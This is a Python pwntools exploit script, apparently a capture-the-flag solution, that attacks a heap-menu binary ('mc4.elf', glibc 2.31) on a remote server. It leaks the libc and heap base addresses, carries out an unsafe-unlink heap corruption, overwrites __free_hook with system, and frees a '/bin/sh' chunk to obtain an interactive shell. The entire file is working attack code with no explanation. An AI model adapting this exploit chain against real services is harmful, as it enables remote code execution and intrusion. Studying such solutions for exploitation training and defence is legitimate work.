#!/usr/bin/env python3

from pwn import *

elf = ELF("mc4.elf")
libc = ELF("./libc-2.31.so", checksec=False)
# g = ROP(libc)

s  = remote("109.233.56.90", 11808)
# s = process(["./ld-2.31.so", elf.path], env={"LD_PRELOAD":"./libc-2.31.so"})
# s = process(elf.path)

CHUNKS_COUNT = 0


def main():

	chunks_list = 0x4040C0

	# Prepare to leak
	a = malloc()
	_a = malloc()
	b = malloc()
	c = malloc()
	free(a)
	free(b)
	free(c)

	# Leak the Libc base
	addr = read(a)
	libc_base = u64(addr.ljust(8, b'\x00')) - 0x1ebbe0
	s.success(f"Libc base is: {hex(libc_base)}")
	free_hook_plt = libc_base + libc.sym["__free_hook"]
	system_plt = libc_base + libc.sym["system"]

	# Leak the Heap base
	addr = read(b)
	heap_base = u64(addr.ljust(8, b'\x00')) >> 12 << 12
	s.success(f"Heap base is: {hex(heap_base)}")


	for _ in range(3):
		malloc()


	# Unsafe Unlink
	chunk_A = malloc()
	chunk_B = malloc()
	chunk_A_ptr = chunks_list + chunk_A*8
	pl = flat({
		0x000: p64(0x0),
		0x008: p64(0x801),
		0x010: p64(chunk_A_ptr - 0x18),
		0x018: p64(chunk_A_ptr - 0x10),
		0x800: p64(0x800),
		0x808: p64(0x810),
	}, filler=b'\x00')
	edit(chunk_A, len(pl), pl)
	free(chunk_B)

	# Target all chunk_ptrs to __free_hook
	imposter_chunk = chunk_A
	pl = p64(free_hook_plt)*20
	edit(imposter_chunk, len(pl), pl)

	# __free_hook = &system
	edit(7, 8, p64(system_plt))

	# system('/bin/sh')
	win = malloc()
	edit(win, 8, b'/bin/sh\x00')
	free(win)

	# gdb.attach(s)
	s.interactive()


def malloc():
	global CHUNKS_COUNT
	s.sendlineafter(b'Choose:\n', b'1')
	CHUNKS_COUNT += 1
	return CHUNKS_COUNT - 1
	

def read(id):
	s.sendlineafter(b'Choose:\n', b'2')
	s.sendlineafter(b'Enter index:\n', str(id).encode())
	s.recvuntil(b'Your data: ')
	return s.recvline(False)


def edit(id, size, data):
	s.sendlineafter(b'Choose:\n', b'3')
	s.sendlineafter(b'Enter index:\n', str(id).encode())
	s.sendlineafter(b'Enter size:\n', str(size).encode())
	s.sendlineafter(b'Enter data:\n', data)


def free(id):
	global CHUNKS_COUNT
	s.sendlineafter(b'Choose:\n', b'4')
	s.sendlineafter(b'Enter index:\n', str(id).encode())
	# CHUNKS_COUNT -= 1


if __name__=="__main__":
	main()